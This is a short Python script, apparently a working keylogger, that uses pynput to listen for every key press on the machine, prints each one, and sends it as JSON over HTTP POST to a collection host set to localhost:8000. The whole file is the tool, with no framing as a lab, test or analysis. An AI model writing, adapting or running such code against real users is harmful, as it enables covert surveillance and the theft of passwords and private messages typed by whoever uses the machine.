from pynput import keyboard
import requests
HOST = "http://localhost:8000"

def main():
    with keyboard.Listener(
            on_press=on_press,
            #on_release=on_release,
            ) as listener:
        listener.join()
    
def on_press(key):
    try:
        print(key.char, end="", flush=True)
        posting(HOST, key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            print(' ', end="", flush=True)
        else:
            print('')
            print(key, flush=True)
        posting(HOST, str(key))

def posting(host, value):
    requests.post(host, json={"key": value})


if __name__ == "__main__":
    main()
